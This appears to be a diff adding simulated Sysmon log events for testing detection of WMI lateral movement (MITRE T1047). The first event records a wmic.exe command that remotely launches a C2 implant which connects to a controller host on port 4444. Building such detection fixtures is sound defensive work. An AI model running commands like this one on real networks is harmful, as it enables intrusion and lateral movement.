@@ -1,0 +1,128 @@
+[
+  {
+    "@timestamp": "2026-03-22T09:14:32.441Z",
+    "event": {
+      "category": "process",
+      "type": "start",
+      "action": "Process Create (rule: ProcessCreate)",
+      "code": "1"
+    },
+    "process": {
+      "pid": 5832,
+      "name": "wmic.exe",
+      "executable": "C:\\Windows\\System32\\wbem\\wmic.exe",
+      "command_line": "wmic.exe /node:192.168.10.45 process call create \"C:\\Users\\clee\\AppData\\Local\\Temp\\sync_agent.exe -s 192.168.10.200 -p 4444\"",
+      "parent": {
+        "pid": 7104,
+        "name": "sync_agent.exe",
+        "executable": "C:\\Users\\clee\\AppData\\Local\\Temp\\sync_agent.exe"
+      }
+    },
+    "user": {
+      "name": "clee",
+      "domain": "CORP"
+    },
+    "host": {
+      "name": "WS-FINANCE-01",
+      "os": {
+        "platform": "windows"
+      }
+    },
+    "agent": {
+      "type": "sysmon"
+    },
+    "_simulation": {
+      "type": "attack",
+      "technique": "T1047",
+      "sequence_order": 1,
+      "sequence_total": 3,
+      "description": "Fawkes wmi command \u00e2\u20ac\u201d wmic.exe used to remotely create a process on a lateral target, spawned from the C2 implant"
+    }
+  },
+  {
+    "@timestamp": "2026-03-22T09:14:33.819Z",
+    "event": {
+      "category": "network",
+      "type": "connection",
+      "action": "Network connection detected (rule: NetworkConnect)",
+      "code": "3"
+    },
+    "process": {
+      "pid": 5832,
+      "name": "wmic.exe",
+      "executable": "C:\\Windows\\System32\\wbem\\wmic.exe"
+    },
+    "destination": {
+      "ip": "192.168.10.45",
+      "port": 135
+    },
+    "source": {
+      "ip": "192.168.10.12",
+      "port": 49712
+    },
+    "network": {
+      "direction": "egress",
+      "transport": "tcp"
+    },
+    "user": {
+      "name": "clee",
+      "domain": "CORP"
+    },
+    "host": {
+      "name": "WS-FINANCE-01",
+      "os": {
+        "platform": "windows"
+      }
+    },
+    "agent": {
+      "type": "sysmon"
+    },
+    "_simulation": {
+      "type": "attack",
+      "technique": "T1047",
+      "sequence_order": 2,
+      "sequence_total": 3,
+      "description": "wmic.exe initiates DCE/RPC connection to remote host on port 135 as part of WMI lateral movement"
+    }
+  },
+  {
+    "@timestamp": "2026-03-22T09:14:35.207Z",
+    "event": {
+      "category": "process",
+      "type": "start",
+      "action": "Process Create (rule: ProcessCreate)",
+      "code": "1"
+    },
+    "process": {
+      "pid": 6120,
+      "name": "WmiPrvSE.exe",
+      "executable": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
+      "command_line": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe -secured -Embedding",
+      "parent": {
+        "pid": 860,
+        "name": "svchost.exe",
+        "executable": "C:\\Windows\\System32\\svchost.exe"
+      }
+    },
+    "user": {
+      "name": "clee",
+      "domain": "CORP"
+    },
+    "host": {
+      "name": "WS-FINANCE-01",
+      "os": {
+        "platform": "windows"
+      }
+    },
+    "agent": {
+      "type": "sysmon"
+    },
+    "_simulation": {
+      "type": "attack",
+      "technique": "T1047",
+      "sequence_order": 3,
+      "sequence_total": 3,
+      "description": "WmiPrvSE.exe spawned by svchost under attacker user context \u00e2\u20ac\u201d indicates WMI provider host activated to execute remote process call on behalf of clee"
+    }
+  }
+]
